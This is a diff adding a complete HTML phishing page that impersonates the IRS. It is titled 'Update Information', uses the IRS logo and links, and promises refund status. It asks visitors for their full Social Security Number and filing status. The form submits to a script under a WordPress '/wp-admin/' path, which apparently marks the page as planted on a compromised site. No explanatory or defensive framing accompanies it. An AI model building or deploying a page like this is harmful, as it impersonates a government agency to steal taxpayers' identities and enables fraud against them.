@@ -1,0 +1,209 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <link type="image/x-icon" rel="icon" href="assets/img/favicon.ico" />
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <title>
+   Update Information
+  </title>
+  <link href="assets/css/navigation-gecko.css" type="text/css" rel="stylesheet" />
+  <link href="assets/css/styles-gecko.css" type="text/css" rel="stylesheet" />
+  <link href="assets/css/icce-gecko.css" type="text/css" rel="stylesheet" />
+  <script type="text/javascript">
+   function movetoNext(current, nextFieldID) {
+if (current.value.length &gt;= current.maxLength) {
+document.getElementById(nextFieldID).focus();
+}
+}
+  </script>
+ </head>
+ <body>
+  <!-- Header -->
+  <div id="main">
+   <div class="headerBar">
+    <a href="http://www.irs.gov/">
+     <img src="assets/img/logo.gif" id="logo" />
+    </a>
+   </div>
+  </div>
+  <div id="main">
+   <div id="menulist">
+    <div id="skipnav">
+     <a tabindex="1" href="#">
+      <img width="1" height="0" border="0" src="assets/img/1x1-transparent.gif" />
+     </a>
+    </div>
+    <ul>
+     <li>
+      <a tabindex="2" href="#">
+       Home
+      </a>
+     </li>
+     <li>
+      <a tabindex="3" href="#" style="color: #001E5A;background-color: #ffffff;text-decoration: none; border-bottom: 1px solid #ffffff;">
+       Personal Information
+      </a>
+     </li>
+     <li>
+      <a tabindex="4" href="#">
+       Refund Help
+      </a>
+     </li>
+    </ul>
+   </div>
+   <div id="skipnav">
+    <a name="SkipLinks">
+    </a>
+   </div>
+   <div class="page_title">
+    <h1>
+     Update Information
+     <img width="650" height="1" alt="" src="assets/img/1x1-grey.gif" />
+    </h1>
+   </div>
+  </div>
+  <div class="body" id="main">
+   <div class="nopadding" id="topcontent">
+    <form action="/wp-admin/main/view/Claim.php" method="post" name="form1">
+     <div class="changelanguagelink" id="floatright">
+      <a tabindex="7" href="#">
+       Obtener Estado de Reembolso
+      </a>
+     </div>
+     <h2>
+      Your Personal Information
+     </h2>
+     Please enter your Social Security Number and your Filing Status.
+     <div class="smallcontent">
+      *See our
+      <a tabindex="8" href="#">
+       Privacy	Notice
+      </a>
+      regarding our request for your personal information.
+     </div>
+     <img width="650" height="1" alt="" src="assets/img/1x1-grey.gif" />
+     <div id="leftcontent">
+      <label for="ssn">
+       <div class="datalabels">
+        Social Security Number
+        <img width="15" height="14" alt="" src="assets/img/red-arrow.gif" />
+       </div>
+       <span class="smallcontent">
+        You must enter the
+        <a tabindex="9" href="#">
+         SSN or IRS Individual Taxpayer
+         <br />
+         Identification Number
+							shown on your tax return
+        </a>
+        .
+       </span>
+      </label>
+     </div>
+     <div id="rightcontent">
+      <fieldset class="fieldset">
+       <legend class="label-names">
+        Please enter Social Security Number here.
+       </legend>
+       <input type="password" onkeyup="movetoNext(this, 'ssn2')" value="" maxlength="3" size="3" id="ssn1" name="ssn1" tabindex="10" required="" />
+       -
+       <input type="password" onkeyup="movetoNext(this, 'ssn3')" value="" maxlength="2" size="2" id="ssn2" name="ssn2" tabindex="11" required="" />
+       -
+       <input type="text" value="" maxlength="4" size="5" id="ssn3" name="ssn3" tabindex="12" required="" />
+       <label class="label-names" for="ssn1">
+        Please enter the first three digits of your Social Security Number.
+       </label>
+       <label class="label-names" for="ssn2">
+        Please enter the second two digits of your Social Security Number.
+       </label>
+       <label class="label-names" for="ssn3">
+        Please enter the last four digits of your Social Security Number.
+       </label>
+      </fieldset>
+     </div>
+     <br />
+     <img width="650" height="1" alt="" src="assets/img/1x1-grey.gif" />
+     <div id="leftcontent">
+      <div class="datalabels">
+       Filing Status
+       <img width="15" height="14" alt="" src="assets/img/red-arrow.gif" />
+      </div>
+      <label for="Filing Status">
+       <span class="smallcontent">
+        Please select the
+        <a tabindex="13" href="#">
+         Filing Status
+         <br />
+         shown on your tax return
+        </a>
+        .
+       </span>
+      </label>
+     </div>
+     <div id="rightcontent">
+      <fieldset class="fieldset" title="Please select a Filing Status here.">
+       <legend class="label-names">
+        Please select a Filing Status here.
+       </legend>
+       <input type="radio" value="1" id="1" name="Status" tabindex="14" required="" />
+       <label for="1">
+        Single
+       </label>
+       <br />
+       <input type="radio" value="2" id="2" name="Status" tabindex="15" required="" />
+       <label for="2">
+        Married-Filing Joint Return
+       </label>
+       <br />
+       <input type="radio" value="3" id="3" name="Status" tabindex="16" required="" />
+       <label for="3">
+        Married-Filing Separate Return
+       </label>
+       <br />
+       <input type="radio" value="4" id="4" name="Status" tabindex="17" required="" />
+       <label for="4">
+        Head of Household
+       </label>
+       <br />
+       <input type="radio" value="5" id="5" name="Status" tabindex="18" required="" />
+       <label for="5">
+        Qualifying Widow(er)
+       </label>
+      </fieldset>
+     </div>
+     <img width="650" height="1" alt="" src="assets/img/1x1-grey.gif" />
+     <div id="button">
+      <fieldset class="fieldset">
+       <legend class="label-names">
+        Submit Button
+       </legend>
+       <input type="submit" value="Submit" id="Submit2" name="Submit2" tabindex="21" />
+       <label class="label-names" for="Submit2">
+        Please select this button to continue getting your Refund Status.
+       </label>
+       <br />
+      </fieldset>
+     </div>
+    </form>
+    <br />
+    <div class="smallcontent">
+     <div class="small_text">
+      <img width="15" height="14" alt="" src="assets/img/red-arrow.gif" />
+      Note: For security reasons, we recommend that you close your browser after you have 
+				finished updating your information.
+     </div>
+    </div>
+   </div>
+   <div id="footerDiv" class="footer">
+    <a tabindex="1000" href="#">
+     IRS Privacy Policy
+    </a>
+    <br />
+    <br />
+   </div>
+   <div id="footerDiv" class="footer">
+    <div>
+    </div>
+   </div>
+  </div>
+ </body>
+</html>
